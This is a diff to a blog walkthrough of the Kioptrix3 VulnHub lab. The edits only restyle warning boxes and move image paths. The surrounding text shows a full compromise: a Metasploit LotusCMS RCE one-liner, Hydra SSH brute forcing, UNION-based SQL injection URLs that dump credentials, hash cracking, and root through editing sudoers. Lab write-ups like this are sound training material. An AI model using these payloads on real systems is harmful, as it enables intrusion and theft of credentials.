@@ -41,7 +41,10 @@ Start a simple ARP scan with netdiscover to reveal target IP:
 
 Kioptrix3 has been assigned an IP of **192.168.1.15**. For the sake of simplicity I'll add the IP into **/etc/hosts** file for easier navigation later on. Do this using `echo "192.168.1.15 kioptrix3.com >> /etc/hosts"`. This allows us to reference the machine as `kioptrix3.com` instead of `192.168.1.15`.
 
-> !!! Make sure you do not overwrite your hosts file by inputting only one ">" !!! 
+<div class="notice--warning">
+  <h4>WARNING!</h4>
+  <p>Make sure you do not overwrite your hosts file by inputting only one <b>&gt;</b></p>
+</div>
 
 My next step is a simple `nmap` portscan to detect open ports & running services.
 
@@ -82,15 +85,15 @@ Nmap done: 1 IP address (1 host up) scanned in 11.65 seconds
 
 HTTP (80) and SSH (80) are both open. I wonder what does the webpage look like?
 
-<img src="/img/blog/kioptrix3/kioptrix3-01.png">
+<img src="/assets/img/blog/vulnhub-kioptrix3/kioptrix3-01.png">
 
 Cool. Clicking *Login* shows:
    
-<img src="/img/blog/kioptrix3/kioptrix3-02.png">
+<img src="/assets/img/blog/vulnhub-kioptrix3/kioptrix3-02.png">
 
 and clicking *here* redirects to a gallery:
 
-<img src="/img/blog/kioptrix3/kioptrix3-03.png">
+<img src="/assets/img/blog/vulnhub-kioptrix3/kioptrix3-03.png">
 
 ***
 
@@ -115,7 +118,10 @@ LotusCMS 3.0.3 - Multiple Vulnerabilities                          | php/webapps
 
 Look! A metasploit RCE module. I usually avoid metasploit modules (and you should too), however I'll use it just once for simplicity. `msfconsole -x "use exploit/multi/http/lcms_php_exec; set URI /; set RHOST kioptrix3.com;run"` yields a www-data shell.
 
-> msfconsole -x combines all commands into one
+<div class="notice--info">
+  <h4>Tip:</h4>
+  <p><b>msfconsole -x</b> combines all commands into one</p>
+</div>
    
 After that just view **/home/** directory which shows 2 users - **dreg** and **loneferret**, fire up hydra and brute both of their SSH accounts! Users done. Sorry for not going into much detail when describing the steps! I find this way of getting an user rather stupid, which led to my quick explanation. If you despise using msfconsole, there is a [tool](https://github.com/Hood3dRob1n/LotusCMS-Exploit) on github which can do the same thing.
 
@@ -125,29 +131,29 @@ After that just view **/home/** directory which shows 2 users - **dreg** and **l
 
 Visit the previously mentioned webpage. Inside **Libgoat Press Room** gallery allows sorting of photos by IDs which possibly opens up an SQL injection attack.       
 
-<img src="/img/blog/kioptrix3/kioptrix3-04.png">
+<img src="/assets/img/blog/vulnhub-kioptrix3/kioptrix3-04.png">
 
 Unfortunately explaining the whole idea behind these injections would take ages. I recommend either `SqlMap` (check below) or learning [manual injecting](http://www.hackingarticles.in/manual-sql-injection-exploitation-step-step/) before reading the rest. So, do you see the URL? Changing `id=1` to `id='` causes a query error.
 
-<img src="/img/blog/kioptrix3/kioptrix3-05.png"> 
+<img src="/assets/img/blog/vulnhub-kioptrix3/kioptrix3-05.png"> 
 
 Tadaa! SQL Injection is possible! Time to dump database contents for passwords & usernames :). 
 
 Start out with `kioptrix3.com/gallery/gallery.php?id=1 UNION SELECT 1,2,3,4,5,6#` to find out how many injectable columns the database has *(ORDER BY testing could be used as well)*. 
 
-<img src="/img/blog/kioptrix3/kioptrix3-06.png">
+<img src="/assets/img/blog/vulnhub-kioptrix3/kioptrix3-06.png">
 
 We are able to see columns 2 and 3. Now we can substitute these numbers with SQL commands like **@@version** or **database()** - `kioptrix3.com/gallery/gallery.php?id=1 UNION SELECT 1,@@version,database(),4,5,6#`
 
-<img src="/img/blog/kioptrix3/kioptrix3-07.png">
+<img src="/assets/img/blog/vulnhub-kioptrix3/kioptrix3-07.png">
 
 Dump all tables within our database() output - `kioptrix3.com/gallery/gallery.php?id=1 UNION SELECT 1,table_name,NULL,4,5,6 FROM information_schema.tables WHERE table_schema = 'gallery'#` 
 
-<img src="/img/blog/kioptrix3/kioptrix3-08.png">
+<img src="/assets/img/blog/vulnhub-kioptrix3/kioptrix3-08.png">
 
 Knowing the table names, choose an interesting one and dump its columns - `kioptrix3.com/gallery/gallery.php?id=1 UNION SELECT 1,column_name,NULL,4,5,6 FROM information_schema.columns WHERE table_name = 'dev_accounts'#`
 
-<img src="/img/blog/kioptrix3/kioptrix3-09.png"> 
+<img src="/assets/img/blog/vulnhub-kioptrix3/kioptrix3-09.png"> 
 
 Result shows us 3 columns of interest:
 
@@ -157,7 +163,7 @@ Result shows us 3 columns of interest:
 
 Great! That's exactly what we want. All that remains is one last command which will present us with the sweet credentials - `kioptrix3.com/gallery/gallery.php?id=1 UNION SELECT 1,CONCAT(username,';',id,';',password),NULL,4,5,6 FROM dev_accounts`
 
-<img src="/img/blog/kioptrix3/kioptrix3-10.png"> 
+<img src="/assets/img/blog/vulnhub-kioptrix3/kioptrix3-10.png"> 
 
 The `CONCAT()` just connects all 3 column contents into one statement with a semicolon `;` as delimeter. Ultimately, you can use SqlMap which automates the attack.
 
@@ -181,11 +187,11 @@ Table: dev_accounts
 
 Both hashes being non-salted MD5s, I decide to crack them. You could use a tool like `hashcat` or `johntheripper`, but I'll stick to a simple online [rainbow tables cracker](https://crackstation.net/).
 
-<img src="/img/blog/kioptrix3/kioptrix3-11.png">
+<img src="/assets/img/blog/vulnhub-kioptrix3/kioptrix3-11.png">
 
 Doing some experimenting I find out that the passwords can be used for SSH login. *dreg* has a limited shell and therefore *loneferret*'s account will be used instead. 
 
-<img src="/img/blog/kioptrix3/kioptrix3-12.png">
+<img src="/assets/img/blog/vulnhub-kioptrix3/kioptrix3-12.png">
 
 Boom. Time for some privilege escalation!
 
@@ -204,19 +210,19 @@ User loneferret may run the following commands on the host:
 
 **sudo ht** effectively allows us to edit any file on the system. There are many ways of escalation from such misconfiguration (for example editing public ssh keys for root, changing passwd file or editing sudoers file). I'll do the third one. Before editing the sudoers file make sure to export `TERM` so we can use the graphical component of our command - `loneferret@Kioptrix3:~$ export TERM=xterm`. Once done, open up the **ht** editor.
 
-<img src="/img/blog/kioptrix3/kioptrix3-13.png">
+<img src="/assets/img/blog/vulnhub-kioptrix3/kioptrix3-13.png">
 
 Press F3 to prompt an input window which asks us for a file to open - in our case **/etc/sudoers**.
 
-<img src="/img/blog/kioptrix3/kioptrix3-14.png">
+<img src="/assets/img/blog/vulnhub-kioptrix3/kioptrix3-14.png">
 
 Edit the file so that we can use sudo without limitations.  
 
-<img src="/img/blog/kioptrix3/kioptrix3-15.png"> 
+<img src="/assets/img/blog/vulnhub-kioptrix3/kioptrix3-15.png"> 
 
 When done, `sudo su root` and the box is rooted! Go and get that root flag! 
 
-<img src="/img/blog/kioptrix3/kioptrix3-16.png">
+<img src="/assets/img/blog/vulnhub-kioptrix3/kioptrix3-16.png">
 
 ***
 
